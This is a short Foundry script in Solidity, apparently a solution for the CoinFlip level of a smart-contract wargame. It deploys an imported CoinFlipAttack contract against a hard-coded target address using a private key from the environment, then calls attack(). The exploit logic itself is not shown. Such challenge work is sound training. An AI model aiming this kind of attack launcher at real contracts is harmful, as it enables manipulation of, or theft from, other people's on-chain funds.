// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "../../src/attacks/level03/Attack.sol";
contract CoinFlipAttackScript is Script {


    function run() external {//这里没有直接用EOA来交互，原因请参考说明文档level03.md  
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address targetAddr = 0xB70d81327359F0C44aBf561C97478a84C2Eb8d3A;

        vm.startBroadcast(privateKey);

        CoinFlipAttack attacker = new CoinFlipAttack(targetAddr);

        attacker.attack();

        vm.stopBroadcast();
    }
}